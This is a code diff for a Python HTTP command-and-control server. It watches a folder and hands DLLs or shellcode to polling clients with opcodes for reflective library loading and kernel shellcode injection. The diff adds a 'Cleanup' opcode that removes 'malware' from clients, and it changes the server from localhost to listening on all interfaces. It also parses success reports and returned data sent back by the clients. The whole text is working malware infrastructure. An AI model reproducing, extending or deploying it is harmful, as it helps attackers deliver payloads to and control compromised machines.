@@ -3,10 +3,10 @@ from watchdog.observers import Observer
 from watchdog.events import PatternMatchingEventHandler
 import os
 import queue
-import cgi
+import urllib
 
 # General constants
-PORT = 1230
+PORT = 8080
 WATCHED_PATH = "C:\\Users\\danie\\Desktop\\New folder (2)\\"
 
 # Queue deceleration and constants
@@ -15,11 +15,11 @@ OPCODE = 0
 FILE_PATH = 1
 
 # Opcodes constant values
-KEEP_ALIVE = 0
+KEEP_ALIVE_OPCODE = 0
 
 
 class ServerOpcode:
-    InjectKernelShellcode, LoadLibraryReflectively, *_ = range(1, 10)
+    InjectKernelShellcode, LoadLibraryReflectively, Cleanup, *_ = range(1, 10)
 
 
 class ClientOpcode:
@@ -30,9 +30,12 @@ def OnFileCreation(event):
     if os.path.isdir(event.src_path):
         return
 
-    server_opcode = ServerOpcode.LoadLibraryReflectively if event.src_path.endswith(".dll") else ServerOpcode.InjectKernelShellcode
-
-    print(f"[SERVER] {event.src_path} creation detected.")
+    if event.src_path.lower().endswith("cleanup"):
+        server_opcode = ServerOpcode.Cleanup
+        print(f"[SERVER] Cleanup file detected.")
+    else:
+        server_opcode = ServerOpcode.LoadLibraryReflectively if event.src_path.endswith(".dll") else ServerOpcode.InjectKernelShellcode
+        print(f"[SERVER] {event.src_path} creation detected.")
     q.put((server_opcode, event.src_path))
 
 
@@ -51,50 +54,46 @@ def DirectoryWatchdogSetup():
 
 
 class Handler(BaseHTTPRequestHandler):
-    #protocol_version = 'HTTP/1.1'
+    protocol_version = 'HTTP/1.1'
 
     def do_GET(self):
-        #print("GET recieved")
-
-        server_opcode = KEEP_ALIVE
+        server_opcode = KEEP_ALIVE_OPCODE
         packet_body = b""
 
         if not q.empty():
             item = q.get()
             q.task_done()
-
             server_opcode = item[OPCODE]
 
-            with open(item[FILE_PATH], 'rb') as file:
-                packet_body = file.read()  # Read the file and send the contents
+            if server_opcode != ServerOpcode.Cleanup:
+                print(f"[SERVER] Sending {item[FILE_PATH]} to {self.client_address[0]}...")
+
+                with open(item[FILE_PATH], 'rb') as file:
+                    packet_body = file.read()
+            else:
+                print(f"[SERVER] Removing malware from {self.client_address[0]}...")
 
         self.send_response(200)
-        #self.send_header("Connection", "keep-alive")
         self.send_header("Opcode", server_opcode)
         self.end_headers()
 
-        self.wfile.write(packet_body)  # Read the file and send the contents
-
-
-
-    def ParseClientHTTPRequest(self):
-        client_opcode = int(self.headers.getheader('Opcode'))
-
-        # USE match STATEMENT ON PYTHON 3.10 - CURRENTLY ON BETA
-        if client_opcode == ClientOpcode.Success:
-            print("[CLIENT] Operation completed successfully")
-        elif client_opcode == ClientOpcode.SuccessWithReturnedData:
-            print("[CLIENT] Operation completed successfully")
-        else:
-            print("[CLIENT] Operation failed")
-
+        self.wfile.write(packet_body)
 
     def do_POST(self):
-        print("Post recieved")
-        self.query_string = self.rfile.read(int(self.headers['Content-Length']))
-        self.args = dict(cgi.parse_qsl(self.query_string))
-        print(self.args)
+        length = int(self.headers['Content-Length'])
+        packet_patrameters = urllib.parse.parse_qs(self.rfile.read(length).decode('utf-8'))
 
+        client_opcode = ord(packet_patrameters["Opcode"][0])
+
+        if client_opcode != KEEP_ALIVE_OPCODE:
+
+            # USE match STATEMENT ON PYTHON 3.10 - CURRENTLY ON BETA
+            if client_opcode == ClientOpcode.Success:
+                print(f"[{self.client_address[0]}] Operation completed successfully")
+            elif client_opcode == ClientOpcode.SuccessWithReturnedData:
+                print(f"[{self.client_address[0]}] Operation completed successfully. Returned Data: {packet_patrameters['Returned-Data'][0]}")
+            else:
+                print(f"[{self.client_address[0]}] Operation failed")
 
 if __name__ == "__main__":
 
@@ -102,16 +101,22 @@ if __name__ == "__main__":
     observer.start()
 
     for filename in os.listdir(WATCHED_PATH):
-        server_opcode = ServerOpcode.LoadLibraryReflectively if filename.endswith(".dll") else ServerOpcode.InjectKernelShellcode
+        if filename.lower().endswith("cleanup"):
+            server_opcode = ServerOpcode.Cleanup
+            print(f"[SERVER] Found cleanup file in watched directory.")
+        else:
+            print (f"[SERVER] Found {filename} in watched directory")
+            server_opcode = ServerOpcode.LoadLibraryReflectively if filename.endswith(".dll") else ServerOpcode.InjectKernelShellcode
+
         q.put((server_opcode, WATCHED_PATH + filename))
 
-    Server = HTTPServer(("localhost", PORT), Handler)
-    print("[SERVER] Server started...")
+    Server = HTTPServer(('', PORT), Handler)
+    print("[SERVER] Server started. Listening...")
     try:
         Server.serve_forever()
 
     except KeyboardInterrupt:
-        pass
+        print("[SERVER] Stopping Server...")
 
     observer.stop()
     observer.join()
